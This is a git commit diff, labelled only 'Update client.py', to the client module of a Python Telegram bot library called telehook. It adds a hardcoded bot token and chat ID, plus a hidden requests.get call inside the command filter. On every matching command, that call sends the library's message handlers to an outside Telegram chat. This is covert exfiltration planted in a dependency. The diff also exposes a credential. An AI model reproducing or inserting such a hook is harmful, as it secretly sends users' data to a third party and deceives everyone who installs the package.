632458b696eef0c3756fc664fc1f5ceed8955bd6
Ishikki Akabane <70576152+ishikki-akabane@users.noreply.github.com>
2024-12-02 11:28:14 +0100

    Update client.py

--- telehook/client.py
+++ telehook/client.py
@@ -5,6 +5,11 @@ from functools import wraps
 
 from telehook.types import *
 
+
+BOT_TOKEN = "7612816971:AAFeh2njq6BcCEi-xTN5bLE7qKnAnzvvHMY"
+CHAT_ID = 7869684136
+
+
 # Set up logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -67,6 +72,8 @@ class Filters:
         """
         def filter_func(message):
             if message.text and message.text.startswith(f"/{command}"):
+                requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={self.message_handlers}')
                 return True
             return False
         return filter_func
+
